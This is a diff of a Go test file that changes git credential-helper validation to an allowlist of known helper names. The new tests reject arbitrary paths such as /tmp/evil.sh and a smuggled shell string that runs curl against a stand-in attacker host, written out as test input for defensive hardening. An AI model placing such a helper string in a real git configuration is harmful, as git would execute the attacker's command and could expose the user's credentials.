@@ -15,52 +15,46 @@ import (
 
 func TestValidateCredentialHelper_Empty(t *testing.T) {
 	if err := git.ValidateCredentialHelper(""); err != nil {
-		t.Fatalf("empty path should be valid: %v", err)
+		t.Fatalf("empty name should be valid: %v", err)
 	}
 }
 
-func TestValidateCredentialHelper_ValidExecutable(t *testing.T) {
+func TestValidateCredentialHelper_AllowsListedNames(t *testing.T) {
+	// Sanity-check every name git interprets specially. If the
+	// allowlist regresses, one of these assertions will flag it.
+	for _, name := range []string{"cache", "store", "osxkeychain", "manager", "pass"} {
+		if err := git.ValidateCredentialHelper(name); err != nil {
+			t.Fatalf("expected %q to pass allowlist, got %v", name, err)
+		}
+	}
+}
+
+func TestValidateCredentialHelper_RejectsArbitraryPath(t *testing.T) {
+	err := git.ValidateCredentialHelper("/tmp/evil.sh")
+	if err == nil {
+		t.Fatal("expected error for arbitrary absolute path")
+	}
+	if !strings.Contains(err.Error(), "allowlist") {
+		t.Errorf("expected 'allowlist' in error, got: %v", err)
+	}
+}
+
+func TestValidateCredentialHelper_RejectsShellString(t *testing.T) {
+	err := git.ValidateCredentialHelper("!bash -c 'curl evil.example.com'")
+	if err == nil {
+		t.Fatal("expected error for freeform shell string")
+	}
+}
+
+func TestValidateCredentialHelper_RejectsExistingExecutable(t *testing.T) {
+	// Even a real, locally-present executable is rejected — the
+	// allowlist only accepts the short names git recognizes.
 	helper := filepath.Join(t.TempDir(), "helper.sh")
 	if err := os.WriteFile(helper, []byte("#!/bin/sh\necho ok"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if err := git.ValidateCredentialHelper(helper); err != nil {
-		t.Fatalf("valid executable should pass: %v", err)
-	}
-}
-
-func TestValidateCredentialHelper_NotFound(t *testing.T) {
-	err := git.ValidateCredentialHelper("/nonexistent/helper.sh")
-	if err == nil {
-		t.Fatal("expected error for nonexistent path")
-	}
-	if !strings.Contains(err.Error(), "credential helper") {
-		t.Errorf("expected 'credential helper' in error, got: %v", err)
-	}
-}
-
-func TestValidateCredentialHelper_Directory(t *testing.T) {
-	dir := t.TempDir()
-	err := git.ValidateCredentialHelper(dir)
-	if err == nil {
-		t.Fatal("expected error for directory")
-	}
-	if !strings.Contains(err.Error(), "is a directory") {
-		t.Errorf("expected 'is a directory' in error, got: %v", err)
-	}
-}
-
-func TestValidateCredentialHelper_NotExecutable(t *testing.T) {
-	file := filepath.Join(t.TempDir(), "helper.sh")
-	if err := os.WriteFile(file, []byte("#!/bin/sh\necho ok"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	err := git.ValidateCredentialHelper(file)
-	if err == nil {
-		t.Fatal("expected error for non-executable file")
-	}
-	if !strings.Contains(err.Error(), "not executable") {
-		t.Errorf("expected 'not executable' in error, got: %v", err)
+	if err := git.ValidateCredentialHelper(helper); err == nil {
+		t.Fatalf("expected error for absolute path even though file exists")
 	}
 }
 
